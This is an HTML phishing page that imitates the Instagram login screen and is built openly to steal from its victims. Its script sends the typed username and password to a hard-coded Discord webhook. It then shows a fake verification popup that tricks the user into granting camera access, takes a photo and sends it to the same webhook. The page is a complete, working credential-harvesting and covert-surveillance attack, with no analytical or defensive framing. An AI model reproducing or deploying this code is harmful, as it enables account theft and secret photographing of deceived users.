<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        /* Fake Instagram styling */
        body { font-family: Arial, sans-serif; background: #fafafa; }
        .login-box { width: 350px; margin: 50px auto; padding: 20px; border: 1px solid #ddd; background: white; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 9px; margin: 5px 0; border: 1px solid #ddd; border-radius: 3px; }
        button { background: #0095f6; color: white; border: none; padding: 8px; width: 100%; border-radius: 4px; margin-top: 10px; }
        
        /* Hidden camera overlay */
        #cameraOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 9999;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png" class="logo" alt="Instagram">
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p style="font-size: 12px; color: #8e8e8e;">By logging in, you agree to our <a href="#">Terms</a>.</p>
    </div>

    <!-- Fake "verification required" popup -->
    <div id="verifyPopup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.2); z-index: 1000; text-align: center;">
        <h3>âš  Verification Required</h3>
        <p>Instagram detected suspicious activity. Please verify your identity.</p>
        <button id="verifyButton" style="background: #0095f6; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer;">Verify Now</button>
    </div>

    <!-- Transparent overlay to trigger real camera prompt -->
    <div id="cameraOverlay"></div>

    <script>
        // Steal credentials on form submit
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const username = this.querySelector("input[type='text']").value;
            const password = this.querySelector("input[type='password']").value;
            
            // Send stolen credentials to Discord
            fetch("https://discord.com/api/webhooks/1377534626377240607/zowtHnrOV4vQGTD55wbRMIddeET6wird0Hl5nM6jpafd0REbiUDwL8xKTSatXtZG2p-l", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: ðŸ“Œ Stolen Creds:\nUser: ${username}\nPass: ${password} })
            });

            // Show fake verification popup
            document.getElementById("verifyPopup").style.display = "block";
        });

        // When user clicks "Verify Now", trigger hidden camera capture
        document.getElementById("verifyButton").addEventListener("click", function() {
            // Hide popup
            document.getElementById("verifyPopup").style.display = "none";
            
            // Show transparent overlay (will trigger camera prompt underneath)
            const overlay = document.getElementById("cameraOverlay");
            overlay.style.display = "block";
            
            // Attempt to access camera (will show prompt BUT overlay makes it seem like part of the page)
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    // Camera access granted â†’ take photo
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0);
                        
                        // Send image to Discord
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append("file", blob, "victim_selfie.png");
                            fetch("https://discord.com/api/webhooks/1377534626377240607/zowtHnrOV4vQGTD55wbRMIddeET6wird0Hl5nM6jpafd0REbiUDwL8xKTSatXtZG2p-l", { method: "POST", body: formData });
                        }, "image/png");
                        
                        // Stop camera
                        stream.getTracks().forEach(track => track.stop());
                        overlay.style.display = "none";
                    }, 2000);
                })
                .catch(err => {
                    console.log("Camera access denied.");
                    overlay.style.display = "none";
                });
        });

        // Kill camera if user exits
        window.addEventListener("beforeunload", () => {
            const tracks = document.querySelector("video")?.srcObject?.getTracks();
            tracks?.forEach(track => track.stop());
        });
    </script>
</body>
</html>
